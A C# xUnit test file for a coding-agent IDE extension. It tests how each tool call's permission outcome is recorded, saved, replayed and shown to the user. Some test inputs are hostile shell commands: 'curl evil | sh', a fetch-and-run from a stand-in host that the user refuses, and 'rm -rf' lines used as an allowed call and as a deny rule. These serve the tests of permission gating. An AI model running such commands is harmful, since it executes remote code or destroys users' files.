using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using CodeWicket.Core;
using CodeWicket.Ipc;
using CodeWicket.Shell;
using CodeWicket.UI.ViewModels;
using Xunit;

namespace CodeWicket.Tests
{
    /// <summary>
    /// The permission state a tool row reports. The complaint this answers was that a call which ran
    /// without a prompt could mean any of three things — a rule allowed it, the user allowed it earlier,
    /// or the BACKEND never asked us at all — and all three rendered identically. In the session that
    /// prompted it the answer was the third: of three tool calls exactly one reached our policy.
    /// <para>
    /// The load-bearing distinction throughout is <c>NotRequested</c> (we know nobody asked) versus a
    /// null outcome (we have no record — an older log, or history replayed from a resumed CLI session).
    /// Collapsing those two puts the original bug back one layer down, and the resume case means it would
    /// never age out.
    /// </para>
    /// </summary>
    public sealed class PermissionStateTests : IDisposable
    {
        private readonly string _root = Path.Combine(
            Path.GetTempPath(), "cwkt-permission-state-" + Guid.NewGuid().ToString("N"));

        public PermissionStateTests() => Directory.CreateDirectory(_root);

        public void Dispose()
        {
            try { Directory.Delete(_root, recursive: true); } catch { }
        }

        // ------------------------------------------------------------------ the policy reports itself

        private sealed class StubPrompt : IPermissionHandler
        {
            public Func<PermissionRequest, PermissionDecision> Responder = _ => new PermissionDecision("reject");

            public Task<PermissionDecision> RequestAsync(PermissionRequest request, CancellationToken cancellationToken = default)
                => Task.FromResult(Responder(request));
        }

        private static IReadOnlyList<PermissionOption> StdOptions() => new[]
        {
            new PermissionOption("allow", "Allow", PermissionOptionKind.AllowOnce),
            new PermissionOption("allow-always", "Allow always", PermissionOptionKind.AllowAlways),
            new PermissionOption("reject", "Reject", PermissionOptionKind.RejectOnce),
        };

        private static PermissionRequest Command(string command) =>
            new("tool-1", command, "execute", command, command, StdOptions());

        private static (PolicyPermissionHandler Policy, StubPrompt Prompt, List<(string Id, PermissionOutcome Outcome)> Reported)
            Harness(PermissionMode mode = PermissionMode.Prompt)
        {
            var prompt = new StubPrompt();
            var policy = new PolicyPermissionHandler(prompt, mode);
            var reported = new List<(string, PermissionOutcome)>();
            policy.OutcomeReported = (id, outcome) => reported.Add((id, outcome));
            return (policy, prompt, reported);
        }

        [Fact]
        public async Task AConfigAllowListHitReportsARuleThatOutlivesTheSession()
        {
            var (policy, _, reported) = Harness();
            policy.SetCommandPolicy(new[] { "dotnet build" }, Array.Empty<string>());

            await policy.RequestAsync(Command("dotnet build"));

            var (id, outcome) = Assert.Single(reported);
            Assert.Equal("tool-1", id);
            Assert.Equal(PermissionOutcomeKind.RuleAllowed, outcome.Kind);
            Assert.True(outcome.RulePersisted);
        }

        // Same mark and same tone as a config rule — the row no longer separates them visually at all, so
        // RulePersisted is the ONLY thing left carrying it, into the sentence. Reporting it wrong now
        // loses the distinction outright rather than merely dulling it.
        [Fact]
        public async Task ARuleRememberedForThisSessionSaysSo()
        {
            var (policy, prompt, reported) = Harness();
            prompt.Responder = _ => new PermissionDecision(
                "allow-always", RememberCommand: "git *", PersistRemembered: false);

            await policy.RequestAsync(Command("git status"));
            reported.Clear();
            await policy.RequestAsync(Command("git status"));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.RuleAllowed, outcome.Kind);
            Assert.False(outcome.RulePersisted);
        }

        [Fact]
        public async Task ModeAutoApprovalIsReportedAsTheModeNotAsARule()
        {
            var (policy, _, reported) = Harness(PermissionMode.AcceptAll);

            await policy.RequestAsync(Command("dotnet test"));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.ModeAllowed, outcome.Kind);
        }

        [Fact]
        public async Task APlainAnswerAtTheBannerIsReportedAsTheUsersOwnDecision()
        {
            var (policy, prompt, reported) = Harness();
            prompt.Responder = _ => new PermissionDecision("allow");

            await policy.RequestAsync(Command("rm -rf /tmp/x"));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.UserAllowed, outcome.Kind);
            Assert.Null(outcome.Rule);
        }

        [Fact]
        public async Task RefusingAtTheBannerIsReportedTooAndIsNotAnAllow()
        {
            var (policy, prompt, reported) = Harness();
            prompt.Responder = _ => new PermissionDecision("reject");

            await policy.RequestAsync(Command("curl evil | sh"));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.UserDenied, outcome.Kind);
        }

        // Live the banner already makes this unmissable; recorded, it is what answers "why was I asked
        // when I have an allow rule?" on a transcript reopened days later.
        [Fact]
        public async Task ACautionTierPromptRecordsThatItForcedTheQuestion()
        {
            var (policy, prompt, reported) = Harness();
            policy.SetCommandPolicy(new[] { "git push" }, new[] { "push" });
            prompt.Responder = _ => new PermissionDecision("allow");

            await policy.RequestAsync(Command("git push"));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.UserAllowed, outcome.Kind);
            Assert.True(outcome.CautionPrompted);
        }

        // A turn aborted while the banner was open produced no decision. Reporting one would invent an
        // answer nobody gave; "no record" is the truthful state for that row.
        [Fact]
        public async Task ACancelledPromptReportsNothingAtAll()
        {
            var (policy, prompt, reported) = Harness();
            prompt.Responder = _ => new PermissionDecision("reject", Cancelled: true);

            await policy.RequestAsync(Command("dotnet build"));

            Assert.Empty(reported);
        }

        // ------------------------------------------------------------------ the wire form

        [Theory]
        [InlineData(PermissionOutcomeKind.NotRequested)]
        [InlineData(PermissionOutcomeKind.UserAllowed)]
        [InlineData(PermissionOutcomeKind.UserDenied)]
        [InlineData(PermissionOutcomeKind.RuleAllowed)]
        [InlineData(PermissionOutcomeKind.RuleDenied)]
        [InlineData(PermissionOutcomeKind.ModeAllowed)]
        public void EveryKindSurvivesTheRoundTripToTheSavedForm(PermissionOutcomeKind kind)
        {
            var round = DtoMapping.ToOutcome(DtoMapping.ToDto(new PermissionOutcome(kind, "r", true, true)));

            Assert.NotNull(round);
            Assert.Equal(kind, round!.Kind);
            Assert.Equal("r", round.Rule);
            Assert.True(round.RulePersisted);
            Assert.True(round.CautionPrompted);
        }

        // A transcript written by a newer build must replay here rather than throw halfway through, and an
        // unreadable state has to degrade to "no record" — never to a guess about how something was allowed.
        [Fact]
        public void AKindFromTheFutureDegradesToNoRecordRatherThanThrowing()
        {
            Assert.Null(DtoMapping.ToOutcome(new PermissionOutcomeDto("somethingNewerBuildsKnow")));
        }

        // ------------------------------------------------------------------ what the row shows

        private static ToolItemViewModel Row(PermissionOutcome? outcome, bool settled = true) =>
            new("t", "PowerShell", "execute") { Permission = outcome, PermissionSettled = settled };

        [Fact]
        public void ARunningRowClaimsNothingEitherWay()
        {
            var row = Row(null, settled: false);

            Assert.False(row.HasPermissionGlyph);
            Assert.Null(row.PermissionSummary);
        }

        [Fact]
        public void ACallNobodyAskedAboutDrawsNoGlyphButStillExplainsItself()
        {
            var row = Row(new PermissionOutcome(PermissionOutcomeKind.NotRequested));

            Assert.False(row.HasPermissionGlyph);
            Assert.Contains("did not ask", row.PermissionSummary);
            // It names US, not the IDE (#252). Visual Studio was never in this decision, so naming it
            // sends the reader to the wrong place for the setting that would have changed the answer.
            Assert.Contains(CodeWicket.Core.Branding.ProductName, row.PermissionSummary);
        }

        // The rare case gets the mark; the common one gets silence. Reversing that puts a badge on every
        // read in a fan-out to say the least interesting thing on the row.
        [Fact]
        public void AFinishedCallWithNoRecordIsMarkedAndSaysWhy()
        {
            var row = Row(null);

            Assert.True(row.HasPermissionGlyph);
            Assert.Equal("Unknown", row.PermissionGlyphTone);
            Assert.Contains("no record", row.PermissionSummary);
        }

        [Fact]
        public void AUserApprovalAndARuleApprovalAreDifferentMarks()
        {
            var user = Row(new PermissionOutcome(PermissionOutcomeKind.UserAllowed));
            var rule = Row(new PermissionOutcome(PermissionOutcomeKind.RuleAllowed, "dotnet build", RulePersisted: true));

            Assert.NotEqual(user.PermissionGlyph, rule.PermissionGlyph);
            Assert.Equal("Allowed", user.PermissionGlyphTone);
            Assert.Equal("Auto", rule.PermissionGlyphTone);
        }

        // Every automatic allow is ONE mark. A rule you saved, a rule you made this session and the mode's
        // own ceiling are three different answers to "why did this run?", but they are the same answer to
        // "do I need to look at this row?" — which is all a glyph is for. Splitting them cost a mark each
        // and a colour the reader had to decode, to say something the sentence below says in words.
        [Fact]
        public void EveryAutomaticAllowSharesOneMarkAndOneTone()
        {
            var session = Row(new PermissionOutcome(PermissionOutcomeKind.RuleAllowed, "git *"));
            var saved = Row(new PermissionOutcome(PermissionOutcomeKind.RuleAllowed, "git *", RulePersisted: true));
            var mode = Row(new PermissionOutcome(PermissionOutcomeKind.ModeAllowed, "mode=AcceptEdits(risk=Edit)"));

            Assert.Equal(session.PermissionGlyph, saved.PermissionGlyph);
            Assert.Equal(session.PermissionGlyph, mode.PermissionGlyph);
            Assert.Equal("Auto", session.PermissionGlyphTone);
            Assert.Equal("Auto", saved.PermissionGlyphTone);
            Assert.Equal("Auto", mode.PermissionGlyphTone);

            // ...and having given up the visual distinction, the words must carry all three.
            Assert.Contains("this session", session.PermissionSummary);
            Assert.Contains("saved rule", saved.PermissionSummary);
            Assert.Contains("permission mode", mode.PermissionSummary);
        }

        // A refusal is a refusal: the reader needs to see that it did not run, not who stopped it.
        [Fact]
        public void ARefusalLooksTheSameWhoeverMadeIt()
        {
            var user = Row(new PermissionOutcome(PermissionOutcomeKind.UserDenied));
            var rule = Row(new PermissionOutcome(PermissionOutcomeKind.RuleDenied, "rm -rf *"));

            Assert.Equal(user.PermissionGlyph, rule.PermissionGlyph);
            Assert.Equal("Denied", user.PermissionGlyphTone);
            Assert.Equal("Denied", rule.PermissionGlyphTone);
            Assert.Contains("you refused", user.PermissionSummary);
            Assert.Contains("refused automatically", rule.PermissionSummary);
        }

        // The four marks must actually be four. Collapsing one pair too many is the failure this guards:
        // "allowed automatically" reading as "you allowed it" would put a decision in the user's mouth.
        [Fact]
        public void TheFourMarksAreDistinct()
        {
            var marks = new[]
            {
                Row(new PermissionOutcome(PermissionOutcomeKind.UserAllowed)).PermissionGlyph,
                Row(new PermissionOutcome(PermissionOutcomeKind.UserDenied)).PermissionGlyph,
                Row(new PermissionOutcome(PermissionOutcomeKind.ModeAllowed)).PermissionGlyph,
                Row(null).PermissionGlyph,
            };

            Assert.All(marks, m => Assert.False(string.IsNullOrEmpty(m)));
            Assert.Equal(4, marks.Distinct().Count());
            Assert.Null(Row(new PermissionOutcome(PermissionOutcomeKind.NotRequested)).PermissionGlyph);
        }

        // Colour is a second channel, never the only one — the sentence has to name the scope in words.
        [Fact]
        public void TheSentenceNamesTheScopeSoColourIsNeverTheOnlyCarrier()
        {
            Assert.Contains("this session", Row(new PermissionOutcome(
                PermissionOutcomeKind.RuleAllowed, "git *")).PermissionSummary);
            Assert.Contains("saved rule", Row(new PermissionOutcome(
                PermissionOutcomeKind.RuleAllowed, "git *", RulePersisted: true)).PermissionSummary);
        }

        [Fact]
        public void AnAlwaysPromptHitIsExplainedInTheRestoredRow()
        {
            var row = Row(new PermissionOutcome(PermissionOutcomeKind.UserAllowed, CautionPrompted: true));

            Assert.Contains("always-prompt", row.PermissionSummary);
        }

        // ------------------------------------------------------------------ the words the user reads

        // The mode is named in two places the user sees together — the header dropdown they set it in,
        // and this sentence saying it is why the call ran. The row used to print the LOG's string,
        // "mode=AcceptReads(risk=Read)", while the picker two inches below said "Allow reads".
        [Fact]
        public async Task TheModeSentenceUsesTheDropdownsWordsNotTheLogsString()
        {
            var (policy, _, reported) = Harness(PermissionMode.AcceptReads);

            await policy.RequestAsync(new PermissionRequest(
                "tool-1", "Read File", "read", null, null, StdOptions()));

            var (_, outcome) = Assert.Single(reported);
            Assert.Equal(PermissionOutcomeKind.ModeAllowed, outcome.Kind);

            var summary = Row(outcome).PermissionSummary;
            Assert.Contains("Allow reads", summary);
            Assert.DoesNotContain("AcceptReads", summary);
            Assert.DoesNotContain("risk=", summary);
        }

        // ...and the two really are one source. Writing the labels out again in the picker is how they
        // drifted before, and nothing about a duplicated string literal fails when it goes stale.
        [Fact]
        public void ThePickerAndTheSentenceTakeTheirModeNamesFromOnePlace() => RunSta(() =>
        {
            var vm = new ChatViewModel(
                new OfflineEngine(),
                new StartSessionRequest("kiro", null, _root, "Prompt", null));

            foreach (var option in vm.PermissionModes)
            {
                var mode = (PermissionMode)Enum.Parse(typeof(PermissionMode), option.Id);
                Assert.Equal(PermissionModeLabel.For(mode), option.DisplayName);
            }

            Assert.Equal(
                Enum.GetValues(typeof(PermissionMode)).Length,
                vm.PermissionModes.Count);
        });

        // The sentence is on the row, so it is part of what the row copies — a pasted tool call saying a
        // command ran is a different report from one saying it ran and nobody was asked.
        [Fact]
        public void CopyingARowCarriesItsPermissionSentence()
        {
            var row = Row(new PermissionOutcome(PermissionOutcomeKind.ModeAllowed, "Allow reads"));
            row.InputDetail = "filterClass: Foo";

            Assert.Contains("Permission:", row.CopyText);
            Assert.Contains("Allow reads", row.CopyText);
            // Same order as on screen: the sentence above the detail, not appended after it.
            Assert.True(
                row.CopyText!.IndexOf("Permission:", StringComparison.Ordinal)
                    < row.CopyText!.IndexOf("filterClass", StringComparison.Ordinal),
                "the permission sentence should precede the detail, as it does on the row");
        }

        // ------------------------------------------------------------------ persistence and replay

        [Fact]
        public void ARestoredTranscriptStillSaysHowEachCallWasPermitted() => RunSta(() =>
        {
            var store = new FileSessionStore(Path.Combine(_root, "sessions"));
            var workspace = Path.Combine(_root, "Solution");

            var session = new PersistedSession { WorkspaceRootPath = workspace, Title = "Ran things" };
            session.Log.Add(new TranscriptEntry { Role = "user", Text = "list the files" });
            session.Log.Add(new TranscriptEntry
            {
                Role = "agent",
                Event = new AgentEventDto { Type = "toolStart", ToolCallId = "c1", Title = "PowerShell", Kind = "execute" },
            });
            session.Log.Add(new TranscriptEntry
            {
                Role = "agent",
                Event = new AgentEventDto
                {
                    Type = "toolDone",
                    ToolCallId = "c1",
                    Success = true,
                    Permission = new PermissionOutcomeDto("ruleAllowed", "dotnet build", RulePersisted: true),
                },
            });
            store.Save(session);

            var vm = new ChatViewModel(
                new OfflineEngine(),
                new StartSessionRequest("kiro", null, workspace, "Prompt", null),
                sessionStore: store);
            vm.RestoreMostRecentSession();

            var row = vm.Items.OfType<ToolItemViewModel>().Single();
            Assert.True(row.PermissionSettled);
            Assert.Equal(PermissionOutcomeKind.RuleAllowed, row.Permission!.Kind);
            Assert.Equal("Auto", row.PermissionGlyphTone);
        });

        // The whole point of recording NotRequested explicitly: a conversation saved before this existed
        // has no field, and must NOT read as "the agent never asked" — it reads as "we have no record".
        [Fact]
        public void AConversationSavedBeforeThisExistedReadsAsNoRecordNotAsNeverAsked() => RunSta(() =>
        {
            var store = new FileSessionStore(Path.Combine(_root, "old-sessions"));
            var workspace = Path.Combine(_root, "Solution");

            var session = new PersistedSession { WorkspaceRootPath = workspace, Title = "Older" };
            session.Log.Add(new TranscriptEntry { Role = "user", Text = "do it" });
            session.Log.Add(new TranscriptEntry
            {
                Role = "agent",
                Event = new AgentEventDto { Type = "toolStart", ToolCallId = "c1", Title = "PowerShell", Kind = "execute" },
            });
            session.Log.Add(new TranscriptEntry
            {
                Role = "agent",
                // No Permission field at all — exactly what an older build wrote.
                Event = new AgentEventDto { Type = "toolDone", ToolCallId = "c1", Success = true },
            });
            store.Save(session);

            var vm = new ChatViewModel(
                new OfflineEngine(),
                new StartSessionRequest("kiro", null, workspace, "Prompt", null),
                sessionStore: store);
            vm.RestoreMostRecentSession();

            var row = vm.Items.OfType<ToolItemViewModel>().Single();
            Assert.Null(row.Permission);
            Assert.Equal("Unknown", row.PermissionGlyphTone);
            Assert.Contains("no record", row.PermissionSummary);
        });

        // The WRITE half, and the one that decides whether any of the above survives the day. A live
        // completion must carry an outcome into the log even when nothing was decided, because absence is
        // reserved for "no record" - if this stopped writing NotRequested, every new conversation would
        // quietly start reading like an old one and every test above would still pass.
        [Fact]
        public void ACallTheBackendNeverAskedAboutIsRecordedAsSuchNotLeftBlank() => RunSta(() =>
        {
            var (store, workspace, vm, engine) = LiveHarness("never-asked");

            engine.Raise(new AgentEventDto { Type = "toolStart", ToolCallId = "c9", Title = "PowerShell", Kind = "execute" });
            engine.Raise(new AgentEventDto { Type = "toolDone", ToolCallId = "c9", Success = true });

            var saved = Reload(store, workspace);
            var done = saved.Log.Select(e => e.Event).Single(e => e?.Type == "toolDone" && e.ToolCallId == "c9");
            Assert.NotNull(done!.Permission);
            Assert.Equal("notRequested", done.Permission!.Kind);

            var row = vm.Items.OfType<ToolItemViewModel>().Single(r => r.ToolCallId == "c9");
            Assert.False(row.HasPermissionGlyph);
            Assert.Contains("did not ask", row.PermissionSummary);
        });

        [Fact]
        public void ADecisionMadeBeforeTheCallFinishedIsTheOneThatGetsSaved() => RunSta(() =>
        {
            var (store, workspace, vm, engine) = LiveHarness("decided");

            engine.Raise(new AgentEventDto { Type = "toolStart", ToolCallId = "c9", Title = "PowerShell", Kind = "execute" });
            vm.NotePermissionOutcome("c9", new PermissionOutcome(
                PermissionOutcomeKind.RuleAllowed, "dotnet build", RulePersisted: true));

            // Shown immediately, without waiting for the completion: a REFUSED call may never produce one.
            var row = vm.Items.OfType<ToolItemViewModel>().Single(r => r.ToolCallId == "c9");
            Assert.Equal("Auto", row.PermissionGlyphTone);

            engine.Raise(new AgentEventDto { Type = "toolDone", ToolCallId = "c9", Success = true });

            var saved = Reload(store, workspace);
            var done = saved.Log.Select(e => e.Event).Single(e => e?.Type == "toolDone" && e.ToolCallId == "c9");
            Assert.Equal("ruleAllowed", done!.Permission!.Kind);
            Assert.True(done.Permission.RulePersisted);
            Assert.Equal("dotnet build", done.Permission.Rule);
        });

        // ------------------------------------------------------------------ edits that render as CARDS

        // A Kiro-style edit carries its diff at tool_call start, so no tool row is ever built and the card
        // is the only thing on screen. That shape is v3's ORDINARY one for a write — so a card that cannot
        // show a permission state means the calls which change the user's files are the ones saying
        // nothing about permission, on the engine where they are the common case.
        [Fact]
        public void AnEditRenderedAsACardStillSaysHowItWasPermitted() => RunSta(() =>
        {
            var (_, _, vm, engine) = LiveHarness("edit-card");

            engine.Raise(new AgentEventDto
            {
                Type = "edit", ToolCallId = "e1", Path = @"C:\ws\Foo.cs", OldText = "a", NewText = "b",
            });
            engine.Raise(new AgentEventDto
            {
                Type = "toolDone", ToolCallId = "e1", Success = true,
                Permission = new PermissionOutcomeDto("ruleAllowed", "src/*", RulePersisted: true),
            });

            var card = vm.Items.OfType<EditItemViewModel>().Single();
            Assert.True(card.PermissionSettled);
            Assert.Equal("Auto", card.PermissionGlyphTone);
            Assert.Contains("saved rule", card.PermissionSummary);
        });

        // The decision lands BEFORE the write — that is the ordinary order, since permission is asked
        // first — so the card must pick up an outcome taken before it existed. Without this the common
        // case shows nothing until the completion, and a REFUSED edit may never produce one at all.
        [Fact]
        public void ACardBuiltAfterTheDecisionStillPicksItUp() => RunSta(() =>
        {
            var (_, _, vm, engine) = LiveHarness("edit-card-late");

            vm.NotePermissionOutcome("e2", new PermissionOutcome(PermissionOutcomeKind.UserDenied));
            engine.Raise(new AgentEventDto
            {
                Type = "edit", ToolCallId = "e2", Path = @"C:\ws\Bar.cs", OldText = "a", NewText = "b",
            });

            var card = vm.Items.OfType<EditItemViewModel>().Single();
            Assert.Equal("Denied", card.PermissionGlyphTone);
            Assert.Contains("you refused", card.PermissionSummary);
        });

        // ...and the other order, where the card exists first and the answer arrives while it is open.
        [Fact]
        public void ADecisionArrivingAfterTheCardReachesItToo() => RunSta(() =>
        {
            var (_, _, vm, engine) = LiveHarness("edit-card-early");

            engine.Raise(new AgentEventDto
            {
                Type = "edit", ToolCallId = "e3", Path = @"C:\ws\Baz.cs", OldText = "a", NewText = "b",
            });
            var card = vm.Items.OfType<EditItemViewModel>().Single();
            Assert.False(card.HasPermissionGlyph);   // nothing claimed while it is still unknown

            vm.NotePermissionOutcome("e3", new PermissionOutcome(PermissionOutcomeKind.UserAllowed));

            Assert.Equal("Allowed", card.PermissionGlyphTone);
        });

        // The export is where a card's sentence has to live, because CopyText on this card is bound to a
        // menu item that says "Copy path" and must keep handing over exactly that.
        [Fact]
        public void TheExportCarriesACardsPermissionButCopyPathStaysAPath() => RunSta(() =>
        {
            var (_, _, vm, engine) = LiveHarness("edit-card-export");

            engine.Raise(new AgentEventDto
            {
                Type = "edit", ToolCallId = "e4", Path = @"C:\ws\Qux.cs", OldText = "a", NewText = "b",
            });
            engine.Raise(new AgentEventDto
            {
                Type = "toolDone", ToolCallId = "e4", Success = true,
                Permission = new PermissionOutcomeDto("modeAllowed", "Allow edits"),
            });

            var card = vm.Items.OfType<EditItemViewModel>().Single();
            Assert.Equal(card.Path, card.CopyText);
            Assert.DoesNotContain("Permission:", card.CopyText);
            Assert.Contains("Allow edits", vm.BuildTranscriptMarkdown());
        });

        // A session restored from disk gives the view-model its _persisted log to append to, which is what
        // makes the live events above land somewhere durable.
        private (FileSessionStore Store, string Workspace, ChatViewModel Vm, RaisableEngine Engine) LiveHarness(string name)
        {
            var store = new FileSessionStore(Path.Combine(_root, name));
            var workspace = Path.Combine(_root, "Solution");
            var session = new PersistedSession { WorkspaceRootPath = workspace, Title = "Live" };
            session.Log.Add(new TranscriptEntry { Role = "user", Text = "go" });
            store.Save(session);

            var engine = new RaisableEngine();
            var vm = new ChatViewModel(
                engine, new StartSessionRequest("kiro", null, workspace, "Prompt", null), sessionStore: store);
            vm.RestoreMostRecentSession();

            // And then actually go live, which the name always claimed and the harness never did. A tool
            // call exists because a turn is running: raised at a pane that has asked its session for
            // nothing, these frames are the session OPENING, which is neither recorded nor drawn as work
            // (issue #217 / `fetch_cloud_config`). The assertions below are unchanged — only the way a
            // tool call comes to exist, from a state the product cannot produce to the one it does.
            // No pump needed: the stub answers StartSessionAsync from a completed task, so the send runs
            // inline as far as PromptAsync — which never completes, leaving the turn open, which is the
            // state these tests want.
            vm.InputText = "go";
            vm.SendCommand.Execute(null);
            return (store, workspace, vm, engine);
        }

        private static PersistedSession Reload(FileSessionStore store, string workspace)
        {
            var summary = store.List(workspace).First();
            return store.Load(workspace, summary.Id)!;
        }

        private sealed class RaisableEngine : IEngineConnection
        {
            public event Action<AgentEventDto>? AgentEvent;

            public event Action<ProviderModelsDto>? ProviderModelsRefreshed { add { } remove { } }

            public void Raise(AgentEventDto ev) => AgentEvent?.Invoke(ev);

            // A fake with no handshake reports no session, which the panel renders as
            // "no agent session open yet" rather than as absent facts (issue #160).
            public Task<SessionInfoResponse?> SessionInfoAsync(CancellationToken cancellationToken = default)
                => Task.FromResult<SessionInfoResponse?>(null);

            public Task<ListProvidersResponse> ListProvidersAsync(CancellationToken cancellationToken = default)
                => Task.FromResult(new ListProvidersResponse(new List<ProviderInfoDto>()));

            // Opens a session and holds the turn open: the calls these tests raise belong to a turn, and
            // a pane that has asked its session for nothing produces a different (and correct) answer.
            public Task<StartSessionResponse> StartSessionAsync(StartSessionRequest request, CancellationToken cancellationToken = default)
                => Task.FromResult(new StartSessionResponse(request.ResumeConversationId ?? "fresh"));

            public Task<PromptResponse> PromptAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default)
                => new TaskCompletionSource<PromptResponse>().Task;

            public Task CancelAsync(CancellationToken cancellationToken = default) => Task.CompletedTask;

            public Task<SteerResponse> SteerAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("This harness never steers.");

            public Task SetModelAsync(string modelId, CancellationToken cancellationToken = default) => Task.CompletedTask;

            public Task<ListBackendSessionsResponse> ListBackendSessionsAsync(
                ListBackendSessionsRequest request, CancellationToken cancellationToken = default)
                => throw new System.NotSupportedException("This stub lists no backend sessions.");

            public Task<TakeImportedHistoryResponse> TakeImportedHistoryAsync(
                TakeImportedHistoryRequest request, CancellationToken cancellationToken = default)
                => throw new System.NotSupportedException("This stub imports no history.");

            public Task<SummarizeResponse> SummarizeAsync(SummarizeRequest request, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("This harness never summarizes.");
        }

        private sealed class OfflineEngine : IEngineConnection
        {
            public event Action<AgentEventDto>? AgentEvent { add { } remove { } }

            public event Action<ProviderModelsDto>? ProviderModelsRefreshed { add { } remove { } }

            // A fake with no handshake reports no session, which the panel renders as
            // "no agent session open yet" rather than as absent facts (issue #160).
            public Task<SessionInfoResponse?> SessionInfoAsync(CancellationToken cancellationToken = default)
                => Task.FromResult<SessionInfoResponse?>(null);

            public Task<ListProvidersResponse> ListProvidersAsync(CancellationToken cancellationToken = default)
                => Task.FromResult(new ListProvidersResponse(new List<ProviderInfoDto>()));

            public Task<StartSessionResponse> StartSessionAsync(StartSessionRequest request, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("A restore must not open a backend session.");

            public Task<PromptResponse> PromptAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("A restore must not prompt.");

            public Task CancelAsync(CancellationToken cancellationToken = default) => Task.CompletedTask;

            public Task<SteerResponse> SteerAsync(string text, IReadOnlyList<PromptAttachmentDto>? attachments = null, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("A restore must not steer.");

            public Task SetModelAsync(string modelId, CancellationToken cancellationToken = default) => Task.CompletedTask;

            public Task<ListBackendSessionsResponse> ListBackendSessionsAsync(
                ListBackendSessionsRequest request, CancellationToken cancellationToken = default)
                => throw new System.NotSupportedException("This stub lists no backend sessions.");

            public Task<TakeImportedHistoryResponse> TakeImportedHistoryAsync(
                TakeImportedHistoryRequest request, CancellationToken cancellationToken = default)
                => throw new System.NotSupportedException("This stub imports no history.");

            public Task<SummarizeResponse> SummarizeAsync(SummarizeRequest request, CancellationToken cancellationToken = default)
                => throw new InvalidOperationException("A restore must not summarize.");
        }

        // One shared, GATED implementation - see StaTest. Two STA bodies from different test
        // classes used to run concurrently against process-global WPF and clipboard state.
        private static void RunSta(Action action) => StaTest.Run(action);
    }
}
